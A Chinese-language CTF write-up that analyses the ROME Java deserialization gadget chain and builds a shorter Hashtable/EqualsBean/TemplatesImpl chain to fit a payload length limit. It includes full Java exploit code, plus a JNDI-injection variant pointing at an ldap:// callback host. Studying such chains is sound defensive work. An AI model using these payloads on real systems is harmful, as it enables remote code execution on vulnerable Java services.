---
created: '22/03/07'
title: 
tags:
  - java
  - java安全
  - 反序列化
---
# 反序列化篇之ROME
在某次比赛中遇到一个java的反序列化题，题目很直接地给了一个jar包，pom.xml里存在ROME1.0的依赖，同时还有一个非常明显的路由: 对body base64解码后反序列化，但是有一个限制是要求body的长度要小于1956，所以就有了这篇文章。

## ROME反序列化链及分析
我们先来看看大名鼎鼎的`ysoserial`里的ROME链，其利用链如下:
```
HashMap<K,V>.readObject(ObjectInputStream)
    HashMap<K,V>.hash(Object) == ObjectBean.hashCode() == EqualsBean.beanHashCode()
       ObjectBean.toString() == ToStringBean.toString()
           ToStringBean.toString(String)
               pReadMethod.invoke(_obj, NO_PARAMS) == TemplatesImpl.getOutputProperties()
                 ...
```

了解一个反序列化链，主要是关注其的source，sink以及关键转折点，这条链的source是HashMap，sink是`TemplatesImpl.getOutputProperties()`造成的新类初始化从而执行新类static中的恶意代码，而关键转折点主要是`pReadMethod.invoke(_obj,NO_PARAMS)`，也是ROME这个依赖我们最后利用到的点。

但是很显然这道题目没办法直接用这条链打通，原因是因为这个链base64之后太长了，单纯执行一个whoami的长度长达4380:
![](https://gitee.com/guuest/images/raw/master/img/20220307102820.png)

为了缩减payload长度，这里参考了一下[终极Java反序列化Payload缩小技术](https://xz.aliyun.com/t/10824)，但最终发现了如果不修改链的话是没办法达到题目要求的长度的，所以我们这里需要去挖掘一条新链:

## 新链1(符合题目要求)
首先我们要了解一下为什么上文的payload如此长，实际上根据调用链我们不难发现ObjectBean是罪魁祸首，其在实例化时会实例化三个bean，这能不大吗:
![](https://gitee.com/guuest/images/raw/master/img/20220307103409.png)

但是ObjectBean实际上是上文链的核心关键: `ObjectBean.hashCode() => ObjectBean._equalsBean.beanHashCode() => ObjectBean._toStringBean.toString()`。如果我们想要抛弃ObjectBean的话，我们没办法通过`HashMap`触发`ToStringBean.toString()`。

上面我们分析到ROME链的关键转折点是`pReadMethod.invoke(_obj,NO_PARAMS)`这段代码，我们可以通过IDEA去搜索一下，可以发现不止ToStringBean存在这个利用点，其他Bean也存在:
![](https://gitee.com/guuest/images/raw/master/img/20220307103228.png)

根据截图我们可以看到`EqualsBean`也存在这个关键代码，可以看到当调用`EqualsBean.equals()`时最终会调用到`EqualsBean.beanEquals()`，触发我们的关键代码:
```java
public boolean equals(Object obj) {  
 return beanEquals(obj);  
}

public boolean beanEquals(Object obj) {
        Object bean1 = _obj;
        Object bean2 = obj;
        boolean eq;
        if (bean2==null) {
            eq = false;
        }
        else
        if (bean1==null && bean2==null) {
            eq = true;
        }
        else
            if (bean1==null || bean2==null) {
                eq = false;
            }
            else {
                if (!_beanClass.isInstance(bean2)) {
                    eq = false;
                }
                else {
                    eq = true;
                    try {
                        PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(_beanClass);
                        if (pds!=null) {
                            for (int i = 0; eq && i<pds.length; i++) {
                                Method pReadMethod = pds[i].getReadMethod();
                                if (pReadMethod!=null && // ensure it has a getter method
                                        pReadMethod.getDeclaringClass()!=Object.class && // filter Object.class getter methods
                                        pReadMethod.getParameterTypes().length==0) {     // filter getter methods that take parameters
                                    Object value1 = pReadMethod.invoke(bean1, NO_PARAMS);
                                    Object value2 = pReadMethod.invoke(bean2, NO_PARAMS);
                                    eq = doEquals(value1, value2);
                                }
                            }
                        }
                    }
                    catch (Exception ex) {
                        throw new RuntimeException("Could not execute equals()", ex);
                    }
                }
            }
        return eq;
    }
```

如果我们有过调试和构造CC7链的经验的话，我们很容易想到我们可以使用Hashtable来作为source，触发equals方法:
![](https://gitee.com/guuest/images/raw/master/img/20220307105120.png)

接下来就是根据CC7和ROME链进行改造，最终得到如下的payload(扩展于[EmYiQing/ShortPayload](https://github.com/EmYiQing/ShortPayload)):
```java
package org.sec.payload;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.EqualsBean;

import javax.xml.transform.Templates;
import java.util.HashMap;
import java.util.Hashtable;

public class ROME extends Payload {
    @SuppressWarnings("all")
    public static byte[] getPayloadUseByteCodes(byte[] byteCodes) {
        try {
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_bytecodes", new byte[][]{byteCodes});
            setFieldValue(templates, "_name", "t");

            EqualsBean bean = new EqualsBean(String.class, "s");

            HashMap map1 = new HashMap();
            HashMap map2 = new HashMap();
            map1.put("yy", bean);
            map1.put("zZ", templates);
            map2.put("zZ", bean);
            map2.put("yy", templates);
            Hashtable table = new Hashtable();
            table.put(map1, "1");
            table.put(map2, "2");
            setFieldValue(bean, "_beanClass", Templates.class);
            setFieldValue(bean, "_obj", templates);
            return serialize(table);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new byte[]{};
    }
}
```
让我们来实际测试一下长度:
![](https://gitee.com/guuest/images/raw/master/img/20220307105342.png)
最终base64之后的payload长度只有1452，完美符合我们的预期:
![](https://gitee.com/guuest/images/raw/master/img/20220307105459.png)
### 利用链
```
Hashtable.readObject()
  Hashtable.reconstitutionPut()
    EqualsBean.equals(TemplatesImpl)
      EqualsBean.beanEquals(TemplatesImpl)
        pReadMethod.invoke(_obj, NO_PARAMS) == TemplatesImpl.getOutputProperties()
          ...
```

## 新链2(不符合题目要求)
实际上我们知道`pReadMethod.invoke(_obj,NO_PARAMS)`最终会调用到_obj的所有getter方法，根据我们对反序列化链的了解，实际上我们也可以利用`JdbcRowSetImpl.getDatabaseMetaData()`方法最终触发JNDI注入，我们只需要将sink修改一下即可:
```java
package top.longlone;

import com.sun.rowset.JdbcRowSetImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import sun.misc.BASE64Encoder;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;

public class ROME {
    public static void setFieldValue(Object object, String fieldName, Object value) {
        try {
            Field field = object.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(object, value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws Exception {
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName("ldap://exmaple.dnslog.cn/a");
        jdbcRowSet.setMatchColumn(new String[]{"a"});

        EqualsBean bean = new EqualsBean(String.class, "s");

        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("yy", bean);
        map1.put("zZ", jdbcRowSet);
        map2.put("zZ", bean);
        map2.put("yy", jdbcRowSet);
        Hashtable table = new Hashtable();
        table.put(map1, "1");
        table.put(map2, "2");
        setFieldValue(bean, "_beanClass", JdbcRowSetImpl.class);
        setFieldValue(bean, "_obj", jdbcRowSet);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(baos);
        objectOutputStream.writeObject(table);
        String b64data = new BASE64Encoder().encode(baos.toByteArray());
        System.out.println(b64data.length());

        // 反序列化
        // ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
        // ois.readObject();
    }
}
```
但是当我们运行程序时很遗憾地发现长度还是超出了1956:
![](https://gitee.com/guuest/images/raw/master/img/20220307113636.png)



## 参考文章
- https://c014.cn/blog/java/ROME/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html
- https://xz.aliyun.com/t/10824